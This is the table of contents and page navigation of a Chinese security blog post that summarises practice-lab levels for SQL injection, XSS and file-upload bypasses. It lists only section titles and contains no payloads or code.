</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">a1batr0ss</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">http://example.com/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/gd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/26/%E6%96%87%E7%AB%A0%E5%9C%B0%E5%9D%80/"><img class="prev-cover" src="/img/gd.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">文章地址</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/16/python-point/"><img class="next-cover" src="/img/gd.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">python point</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">a1batr0ss</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/a1batr0ssG"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">请各位师傅指教</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#No-1%E3%80%90%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E3%80%91"><span class="toc-number">1.1.</span> <span class="toc-text">No.1【单引号字符型】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-2%E3%80%90%E6%95%B0%E5%AD%97%E5%9E%8B%E3%80%91"><span class="toc-number">1.2.</span> <span class="toc-text">No.2【数字型】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-3%E3%80%90-%E2%80%98-id%E2%80%99-%E3%80%91"><span class="toc-number">1.3.</span> <span class="toc-text">No.3【 (‘$id’) 】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-4%E3%80%90-%E2%80%9C-id%E2%80%9D-%E3%80%91"><span class="toc-number">1.4.</span> <span class="toc-text">No.4【 (“$id”) 】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B01"><span class="toc-number">1.4.1.</span> <span class="toc-text">发现1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-5%E3%80%90%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.5.</span> <span class="toc-text">No.5【报错型注入】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text">floor报错注入原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml-XML-document-XPath-string-new-value-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text">updatexml(XML_document, XPath_string, new_value)报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E9%83%A8%E5%88%86%E5%9B%9E%E6%98%BE%E7%BB%93%E6%9E%9C%E4%BB%A5%E6%97%A0%E8%A7%86%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">截取部分回显结果以无视长度限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue-%E7%9B%AE%E6%A0%87xml%E6%96%87%E6%A1%A3%EF%BC%8Cxml%E8%B7%AF%E5%BE%84"><span class="toc-number">1.5.3.</span> <span class="toc-text">extractvalue(目标xml文档，xml路径)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-6"><span class="toc-number">1.6.</span> <span class="toc-text">No.6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-7%E3%80%90%E8%BE%93%E5%87%BA%E5%88%B0%E5%A4%96%E9%83%A8%E3%80%91"><span class="toc-number">1.7.</span> <span class="toc-text">No.7【输出到外部】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-8"><span class="toc-number">1.8.</span> <span class="toc-text">No.8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-9%E3%80%90%E6%97%B6%E9%97%B4%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.9.</span> <span class="toc-text">No.9【时间型注入】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-10"><span class="toc-number">1.10.</span> <span class="toc-text">No.10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-11%E3%80%90%E7%99%BB%E5%BD%95%E6%A1%86%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.11.</span> <span class="toc-text">No.11【登录框注入】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E5%8F%91%E7%8E%B01"><span class="toc-number">1.11.1.</span> <span class="toc-text">有趣发现1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-12"><span class="toc-number">1.12.</span> <span class="toc-text">No.12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8F%91%E7%8E%B02"><span class="toc-number">1.12.1.</span> <span class="toc-text">有趣的发现2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-13"><span class="toc-number">1.13.</span> <span class="toc-text">No.13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-14"><span class="toc-number">1.14.</span> <span class="toc-text">No.14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-15"><span class="toc-number">1.15.</span> <span class="toc-text">No.15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E7%95%99%E7%96%91%E6%83%911"><span class="toc-number">1.15.1.</span> <span class="toc-text">遗留疑惑1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-16"><span class="toc-number">1.16.</span> <span class="toc-text">No.16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-17%E3%80%90UPDATE%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E3%80%91"><span class="toc-number">1.17.</span> <span class="toc-text">No.17【UPDATE修改密码】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8F%91%E7%8E%B03"><span class="toc-number">1.17.1.</span> <span class="toc-text">有趣的发现3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E7%95%99%E7%96%91%E6%83%912%E3%80%90%E8%A7%81%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8F%91%E7%8E%B03%E3%80%91"><span class="toc-number">1.17.2.</span> <span class="toc-text">遗留疑惑2【见有趣的发现3】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E7%95%99%E7%96%91%E6%83%913"><span class="toc-number">1.17.3.</span> <span class="toc-text">遗留疑惑3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-18%E3%80%90http%E5%A4%B4uagent%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.18.</span> <span class="toc-text">No.18【http头uagent注入】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-19%E3%80%90http%E5%A4%B4referer%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.19.</span> <span class="toc-text">No.19【http头referer注入】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E7%95%99%E7%96%91%E6%83%913-1"><span class="toc-number">1.19.1.</span> <span class="toc-text">遗留疑惑3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-20%E3%80%90cookie%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.20.</span> <span class="toc-text">No.20【cookie注入】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-21%E3%80%90base64%E5%8A%A0%E5%AF%86%E3%80%91"><span class="toc-number">1.21.</span> <span class="toc-text">No.21【base64加密】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-22"><span class="toc-number">1.22.</span> <span class="toc-text">No.22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-23%E3%80%90%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%E3%80%91"><span class="toc-number">1.23.</span> <span class="toc-text">No.23【过滤注释符】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">1.23.1.</span> <span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-24%E3%80%90%E9%81%97%E7%95%99%E3%80%91"><span class="toc-number">1.24.</span> <span class="toc-text">No.24【遗留】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-25%E3%80%90%E7%BB%95and-x2F-or%E3%80%91"><span class="toc-number">1.25.</span> <span class="toc-text">No.25【绕and&#x2F;or】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-25a"><span class="toc-number">1.26.</span> <span class="toc-text">No.25a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-26%E3%80%90%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%92%8C%E5%B8%B8%E8%A7%81%E5%AD%97%E7%AC%A6%E3%80%91"><span class="toc-number">1.27.</span> <span class="toc-text">No.26【过滤空格和常见字符】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-26a"><span class="toc-number">1.28.</span> <span class="toc-text">No.26a</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E7%9A%84python%E8%84%9A%E6%9C%AC"><span class="toc-number">1.28.1.</span> <span class="toc-text">查看被过滤字符的python脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84url%E7%BC%96%E7%A0%81"><span class="toc-number">1.28.2.</span> <span class="toc-text">代替空格的url编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E7%95%99%E7%96%91%E6%83%914"><span class="toc-number">1.28.3.</span> <span class="toc-text">遗留疑惑4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-27%E3%80%90%E8%BF%87%E6%BB%A4select%E5%92%8Cunion%E3%80%91"><span class="toc-number">1.29.</span> <span class="toc-text">No.27【过滤select和union】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-27a"><span class="toc-number">1.30.</span> <span class="toc-text">No.27a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-28"><span class="toc-number">1.31.</span> <span class="toc-text">No.28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-28a"><span class="toc-number">1.32.</span> <span class="toc-text">No.28a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-29-No-31"><span class="toc-number">1.33.</span> <span class="toc-text">No.29-No.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-32%E3%80%90%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%91%E3%80%90%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E3%80%91"><span class="toc-number">1.34.</span> <span class="toc-text">No.32【宽字节注入】【绕过引号】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-33%E3%80%90addslashes-%E3%80%91"><span class="toc-number">1.35.</span> <span class="toc-text">No.33【addslashes()】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-34%E3%80%90POST%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E3%80%91"><span class="toc-number">1.36.</span> <span class="toc-text">No.34【POST绕过引号】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-35"><span class="toc-number">1.37.</span> <span class="toc-text">No.35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-36-No-37%E3%80%90mysql-real-escape-string-%E3%80%91"><span class="toc-number">1.38.</span> <span class="toc-text">No.36-No.37【mysql_real_escape_string()】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass1%E3%80%90%E6%97%A0%E8%BF%87%E6%BB%A4%E3%80%91"><span class="toc-number">2.1.</span> <span class="toc-text">Pass1【无过滤】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass2%E3%80%90-gt-%E9%97%AD%E5%90%88%E3%80%91"><span class="toc-number">2.2.</span> <span class="toc-text">Pass2【&gt;闭合】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass3%E3%80%90%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6%E3%80%91"><span class="toc-number">2.4.</span> <span class="toc-text">Pass3【单引号闭合触发事件】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass4%E3%80%90%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E8%A7%A6%E5%8F%91%E4%BA%8B%E4%BB%B6%E3%80%91"><span class="toc-number">2.5.</span> <span class="toc-text">Pass4【双引号闭合触发事件】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass5%E3%80%90javascript%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%91"><span class="toc-number">2.6.</span> <span class="toc-text">Pass5【javascript伪协议】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass6%E3%80%90%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">2.7.</span> <span class="toc-text">Pass6【大小写绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass7%E3%80%90%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">2.8.</span> <span class="toc-text">Pass7【双写绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass8%E3%80%90HTML%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">2.9.</span> <span class="toc-text">Pass8【HTML字符实体绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass9%E3%80%90HTML%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93%E7%BB%95%E8%BF%872%E3%80%91"><span class="toc-number">2.10.</span> <span class="toc-text">Pass9【HTML字符实体绕过2】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass10%E3%80%90%E7%9B%B8%E5%90%8C%E5%B1%9E%E6%80%A7%E7%9A%84%E8%A6%86%E7%9B%96%E3%80%91"><span class="toc-number">2.11.</span> <span class="toc-text">Pass10【相同属性的覆盖】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass11%E3%80%90HTTP%E8%AF%B7%E6%B1%82%E5%A4%B41%E3%80%91"><span class="toc-number">2.12.</span> <span class="toc-text">Pass11【HTTP请求头1】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass12%E3%80%90HTTP%E8%AF%B7%E6%B1%82%E5%A4%B42%E3%80%91"><span class="toc-number">2.13.</span> <span class="toc-text">Pass12【HTTP请求头2】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass13%E3%80%90cookie%E4%BC%A0%E5%8F%82%E3%80%91"><span class="toc-number">2.14.</span> <span class="toc-text">Pass13【cookie传参】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass14%E3%80%90exif%E3%80%91"><span class="toc-number">2.15.</span> <span class="toc-text">Pass14【exif】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass15%E3%80%90ng-include%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="toc-number">2.16.</span> <span class="toc-text">Pass15【ng-include包含漏洞】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.16.1.</span> <span class="toc-text">小问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass16%E3%80%90img%E6%A0%87%E7%AD%BE-0a%E6%8D%A2%E8%A1%8C%E3%80%91"><span class="toc-number">2.17.</span> <span class="toc-text">Pass16【img标签+%0a换行】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass17%E3%80%90%E5%8F%82%E6%95%B0%E3%80%91"><span class="toc-number">2.18.</span> <span class="toc-text">Pass17【参数】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass18%E3%80%90%E5%8F%82%E6%95%B02%E3%80%91"><span class="toc-number">2.19.</span> <span class="toc-text">Pass18【参数2】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass19%E3%80%90Flash-XSS%E3%80%91"><span class="toc-number">2.20.</span> <span class="toc-text">Pass19【Flash XSS】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass20%E3%80%90Flash-XSS%EF%BC%88%E5%81%8F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89%E3%80%91"><span class="toc-number">2.21.</span> <span class="toc-text">Pass20【Flash XSS（偏代码审计）】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass1%E3%80%90%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E3%80%91"><span class="toc-number">3.1.</span> <span class="toc-text">Pass1【前端验证】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass2%E3%80%90MIME%E9%AA%8C%E8%AF%81%E3%80%91"><span class="toc-number">3.2.</span> <span class="toc-text">Pass2【MIME验证】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass3%E3%80%90%E5%90%8E%E7%AB%AF%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E5%90%8E%E7%BC%80%E3%80%91"><span class="toc-number">3.3.</span> <span class="toc-text">Pass3【后端黑名单验后缀】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass4%E3%80%90-htaccess%E3%80%91"><span class="toc-number">3.4.</span> <span class="toc-text">Pass4【.htaccess】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%8F%91%E7%8E%B01"><span class="toc-number">3.4.1.</span> <span class="toc-text">小发现1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass5%E3%80%90-user-ini%E3%80%91"><span class="toc-number">3.5.</span> <span class="toc-text">Pass5【.user.ini】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E4%BB%80%E4%B9%88%E6%98%AF-user-ini%EF%BC%9F"><span class="toc-number">3.6.</span> <span class="toc-text">那么什么是.user.ini？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass6%E3%80%90%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E3%80%91-1"><span class="toc-number">3.7.</span> <span class="toc-text">Pass6【大小写绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass7%E3%80%90%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%88Windows%EF%BC%89%E3%80%91"><span class="toc-number">3.8.</span> <span class="toc-text">Pass7【空格绕过（Windows）】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%8F%91%E7%8E%B02"><span class="toc-number">3.8.1.</span> <span class="toc-text">小发现2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass8%E3%80%90%E7%82%B9%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">3.9.</span> <span class="toc-text">Pass8【点绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass9%E3%80%90-DATA%EF%BC%88Windows%EF%BC%89%E3%80%91"><span class="toc-number">3.10.</span> <span class="toc-text">Pass9【::$DATA（Windows）】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass10%E3%80%90-%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">3.11.</span> <span class="toc-text">Pass10【. .绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass12%E3%80%90GET%E6%96%B9%E6%B3%95-00%E6%88%AA%E6%96%AD%E3%80%91"><span class="toc-number">3.12.</span> <span class="toc-text">Pass12【GET方法%00截断】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass13%E3%80%90POST%E6%96%B9%E6%B3%95-00%E6%88%AA%E6%96%AD%E3%80%91"><span class="toc-number">3.13.</span> <span class="toc-text">Pass13【POST方法%00截断】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass14%E3%80%90%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%89%8D%E4%B8%A4%E5%AD%97%E8%8A%82%E3%80%91"><span class="toc-number">3.14.</span> <span class="toc-text">Pass14【检查文件的前两字节】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass15%E3%80%90getimagesize-%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E3%80%91"><span class="toc-number">3.15.</span> <span class="toc-text">Pass15【getimagesize()判断文件类型】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getimagesize"><span class="toc-number">3.16.</span> <span class="toc-text">getimagesize()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass16%E3%80%90exif-imagetype-%E3%80%91"><span class="toc-number">3.17.</span> <span class="toc-text">Pass16【exif_imagetype()】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass14-16%E5%9B%BE%E5%BD%A2%E9%A9%AC%E5%88%B6%E4%BD%9C"><span class="toc-number">3.18.</span> <span class="toc-text">Pass14-16图形马制作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd%E4%B8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E3%80%90powershell%E4%B8%8D%E8%A1%8C%E3%80%91"><span class="toc-number">3.18.1.</span> <span class="toc-text">cmd下执行命令【powershell不行】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#010editor%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%A4%B4%E5%88%B6%E4%BD%9C"><span class="toc-number">3.18.2.</span> <span class="toc-text">010editor修改文件头制作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass17%E3%80%90%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E3%80%91"><span class="toc-number">3.19.</span> <span class="toc-text">Pass17【二次渲染】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%8F%91%E7%8E%B03"><span class="toc-number">3.19.1.</span> <span class="toc-text">小发现3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass18%E3%80%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E3%80%91"><span class="toc-number">3.20.</span> <span class="toc-text">Pass18【条件竞争】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass19%E3%80%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E3%80%91"><span class="toc-number">3.21.</span> <span class="toc-text">Pass19【条件竞争+apache解析漏洞】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%87%E7%A8%8B"><span class="toc-number">3.22.</span> <span class="toc-text">代码审计过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-number">3.22.1.</span> <span class="toc-text">upload:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#isUploadedFIle"><span class="toc-number">3.22.1.1.</span> <span class="toc-text">isUploadedFIle()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setDir-UPLOAD-PATH"><span class="toc-number">3.22.1.2.</span> <span class="toc-text">setDir( UPLOAD_PATH )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkExtension"><span class="toc-number">3.22.1.3.</span> <span class="toc-text">checkExtension()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkSize"><span class="toc-number">3.22.1.4.</span> <span class="toc-text">checkSize()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checkFileExists"><span class="toc-number">3.22.1.5.</span> <span class="toc-text">checkFileExists()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#move"><span class="toc-number">3.22.1.6.</span> <span class="toc-text">move()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#renameFile"><span class="toc-number">3.22.1.7.</span> <span class="toc-text">renameFile()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%8F%91%E7%8E%B04"><span class="toc-number">3.22.2.</span> <span class="toc-text">小发现4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass20%E3%80%90%E2%80%9C-x2F-%E2%80%9D%E7%BB%93%E5%B0%BE%E6%B3%95-%E5%92%8C-POST%E6%96%B9%E6%B3%95-00%E6%88%AA%E6%96%AD2%E3%80%91"><span class="toc-number">3.23.</span> <span class="toc-text">Pass20【“&#x2F;.”结尾法 和 POST方法%00截断2】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.23.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.23.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass21%E3%80%90%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-%E2%80%9C-x2F-%E2%80%9D%E7%BB%95%E8%BF%87%E3%80%91"><span class="toc-number">3.24.</span> <span class="toc-text">Pass21【数组绕过+“&#x2F;.”绕过】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B9%8B%E8%B0%9C"><span class="toc-number">3.25.</span> <span class="toc-text">数组的长度之谜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 